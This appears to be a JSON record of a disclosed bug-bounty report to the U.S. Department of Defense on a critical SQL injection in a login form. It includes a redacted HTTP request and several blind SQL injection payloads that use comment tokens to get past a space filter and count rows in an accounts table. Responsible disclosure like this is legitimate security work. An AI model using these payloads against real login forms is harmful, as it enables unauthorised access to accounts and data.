@@ -1,0 +1,117 @@
+{
+  "id": 982202,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODIyMDI=",
+  "url": "https://hackerone.com/reports/982202",
+  "title": "SQLi in login form of █████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-14T21:00:44.346Z",
+  "submitted_at": "2020-09-14T21:00:44.360Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "erbbysam",
+    "url": "/erbbysam",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-29T20:28:46.838Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-28T18:48:57.677Z",
+  "team_member_agreed_on_going_public_at": "2020-09-29T20:28:46.722Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.\n\n```\nPOST /██████████.asp HTTP/█████.████\nHost: ███████\n```\n\n## Description\n```\nPOST /██████.asp HTTP/████.███\nHost: █████\nConnection: close\nContent-Length: 45\nCache-Control: max-age=0\nUpgr███████e-Insecure-Requests: ███\nOrigin: https://████\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?████████\nSec-Fetch-Dest: document\nReferer: https://████████/wireless/index.asp\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: █████████████████\n\nusr='/**/or/**/lastName!='&pwd=██████████\n```\n\nreturns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.\n\nTo summarize: \n`usr='/**/or/**/lastName!='&pwd=████████` -> 302\n`usr='/**/or/**/abc!='&pwd=███` -> 500\n\ncase error g██████████get (which could be used to exfil data):\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████` -> 302\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████` -> 500\n\nUsing this, we can prove that there are 26 user accounts:\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████` -> 302\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████` -> 500\n\nI have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.\n\n**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**\n\n## Impact\n\nSQLi, likely escalation to full service compromise",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "kegn",
+    "tess",
+    "pr0f0x01",
+    "demonia",
+    "shohag_sp",
+    "z3rod3x",
+    "cipherd2",
+    "indiffirent7",
+    "mr-datacoder",
+    "f0shuh0"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
